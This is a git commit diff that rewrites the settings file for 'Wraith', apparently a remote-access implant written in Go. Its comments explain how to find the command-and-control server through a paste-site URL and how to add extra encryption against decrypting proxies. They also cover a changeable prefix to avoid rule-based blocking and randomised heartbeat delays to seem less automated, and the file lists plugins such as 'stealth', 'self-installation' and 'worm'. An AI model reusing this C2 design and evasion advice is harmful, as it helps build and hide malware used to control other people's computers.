bbdf93a992429937fc51c5a188edc80df72ae252
TR-SLimey <tr_slimey@protonmail.com>
2020-05-05 17:42:10 +0100

    Cleaned up and fixed Wraith settings file

--- CLIENT/wraith_settings.go
+++ CLIENT/wraith_settings.go
@@ -3,61 +3,74 @@ package main
 /*
 
 This file contains the constants used at compile-time. These will be hard-coded
-into the Wraith when it is compiled. Optionally, these can be overridden using
-command line parameters on run if this is enabled below.
+into the Wraith when it is compiled. Some can be overruled by panel commands when
+the Wraith connects.
 
 */
 
-/* Link to *raw text* page containing the URL of the C&C server. Pastebin
-is a good choice but any raw text hosting will do.
-<STRING> */
-const setCCSERVERGETURL string = "http://localhost/location.txt" //"https://pastebin.com/raw/snBS6LEk" //"http://pastebin.com/raw/56BqPLEJ"
+/* Link to *raw text* file containing the URL of the API. pastebin.com
+is a good choice but any raw text hosting will do. If you are sure that the API
+URL will never change, you can simply put the API URL directly here
+but this is not recommended as changing the API URL will then result in losing
+all Wraiths with the previous URL hard-coded. */
+const setCCSERVERGETURL string = "http://localhost/location.txt"
 
-/* */
+/* This is a prefix added to every encrypted API request sent by the Wraith and
+expected at the start of the API response. This is to verify that the Wraith
+is indeed communicating with the Wraith API. It is changeable to prevent rule-based
+blocking. A short prefix saves bandwidth and is less detectable so is recommended. */
 const setAPIREQPREFIX string = "W_"
 
 /* Static encryption key to use during the handshake with the server. It will
 be replaced with a panel-generated key after the handshake until the Wraith
-is restarted or disconnects. This key does not have to be very secure,
+is restarted or disconnects. This key does not have to be extremely secure as
 the primary encryption method is SSL. This is really only used to make Wraith's
-traffic less readable to decrypting proxies.
-<STRING> */
+traffic less readable to decrypting proxies and stop not-too-determined would-be
+snoopers from seeing our traffic. */
 const setSECONDLAYERENCRYPTIONKEY string = "QWERTYUIOPASDFGHJKLZXCVBNM"
 
 /* An ID which the server uses to identify itself. The Wraith will not complete
 a handshake with a server which does not provide a trusted fingerprint. This is
-used to stop accidental connections to the wrong server if the URL is wrong and
-prevent server impersonation.
-<STRING> */
+used to stop accidental connections to the wrong server should something go wrong
+and prevent people from impersonating the server to gain info about the Wraith. */
 const setTRUSTEDSERVERFINGERPRINT string = "ABCDEFGHIJKLMNOP"
-
-/* */
-const setINSTALLONRUN bool = false
 
 /* Delay between each heartbeat request (seconds). This should ideally be just
 under half of the mark dead time on the panel and no less than 3 seconds to
-prevent DDoSing your own server. This value is not permanent and can be
-altered by the panel during runtime but will reset whenever the Wraith
-restarts.
-<UNSIGNED LONG> */
-const setDEFAULTHEARTBEATDELAYBASE uint64 = 10
+prevent DDoSing your own server. This value can be altered by the panel during
+runtime but will reset whenever the Wraith restarts. Making this value lower
+will allow both the Wraith and the panel to have more up-to-date information but
+will make Wraith more detectable (more traffic on the wire) and put more load
+on your server. 7 seconds is a good compromise for most uses. Do note that Wraith
+will add between 0 (inclusive) and 3 (exclusive) seconds to each delay to make
+the requests seem less automated and harder to detect. */
+const setDEFAULTHEARTBEATDELAYBASE uint64 = 7
 
 /* Delay between handshake reattempts should a handshake fail (seconds). This
 should be longer than the heartbeat delay as the server might be unreachable
-for a while so the less traffic we send the better.
-<UNSIGNED LONG> */
-const setDEFAULTHANDSHAKEREATTEMPTDELAY uint64 = 10 // 20
+for a while so the less traffic we send the better. */
+const setDEFAULTHANDSHAKEREATTEMPTDELAY uint64 = 20
 
-/* */
+/* How many handshake fails to ignore before assuming that the connection is dead
+and resetting the connection after the Default Handshake Reattempt Delay. This
+is how many handshake fails Wraith will accept so in reality Wraith will send
+that +1 handshakes before failing. Handshakes which have not exceeded this
+number will be re-attempted after a Heartbeat Delay. */
 const setFAILEDHEARTBEATTOLERANCE uint64 = 2
 
-/* How long to wait for the response to each HTTP request before cancelling
-the request and producing a (caught) error.
-<UNSIGNED LONG> */
-const setDEFAULTHTTPREQUESTTIMEOUT uint64 = 5
-
 /* Whether to write information to the console. It is highly recommended to
-turn this off as leaving it on increases the executable filesize and could
-leak information.
-<NO VALUE> */
+turn this off unless debugging as leaving it on might increase the executable
+filesize and could leak information. */
 const setDEBUG bool = true
+
+/* Which plugins from "include/src/plugins" to include in the Wraith. It is
+best to include as few plugins as possible, as any additional plugins will
+inrease executable file size, take longer to compile and possibly increase
+detectability. */
+var setPLUGINS []string = []string{
+	// "admin-request",
+	// "self-installation",
+	// "stealth",
+	// "watchdog",
+	// "worm",
+}
